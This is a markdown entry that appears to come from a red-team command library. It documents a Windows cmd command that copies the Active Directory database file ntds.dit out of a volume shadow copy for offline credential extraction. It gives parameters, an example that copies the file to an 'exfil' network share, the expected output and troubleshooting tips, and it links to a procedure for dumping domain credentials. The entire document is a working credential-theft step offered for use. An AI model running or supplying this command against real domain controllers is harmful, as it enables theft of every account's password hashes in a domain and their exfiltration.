---
type: command
executor: cmd
data: copy $_SHADOW_PATH\Windows\NTDS\ntds.dit $_OUTPUT_PATH\ntds.dit
output: null
created_at: '2023-04-06T03:56:03.847647+00:00'
updated_at: '2023-04-10T20:26:27.031869+00:00'
platforms:
  - Windows
tags:
  - credential-access
  - active-directory
verified: true
validated: true
---

# copy-ntds-dit-from-shadow-copy

## Command

```cmd
copy $_SHADOW_PATH\Windows\NTDS\ntds.dit $_OUTPUT_PATH\ntds.dit
```

## Description

Copies the Active Directory database file (NTDS.DIT) from a volume shadow copy path to a local directory for offline credential extraction. The shadow path is obtained from vssadmin output.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_SHADOW_PATH | Full shadow volume path (e.g., \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2) | Yes |
| $_OUTPUT_PATH | Destination directory (e.g., C:\temp) | Yes |

## Examples

### Basic Usage

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\ntds.dit C:\temp\ntds.dit
```

### Advanced Usage

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\ntds.dit \\_SHARE\exfil\ntds.dit
```

## Expected Output

```
1 file(s) copied.
```

Verify with `dir $_OUTPUT_PATH`—file size should be 100-500MB. Errors: Invalid path (double-check shadow) or permissions (run as admin).

## Related

- [[commands/create-volume-shadow-copy-vssadmin]]
- [[procedures/Dump-AD-Domain-Credentials-Using-VSSAdmin]]
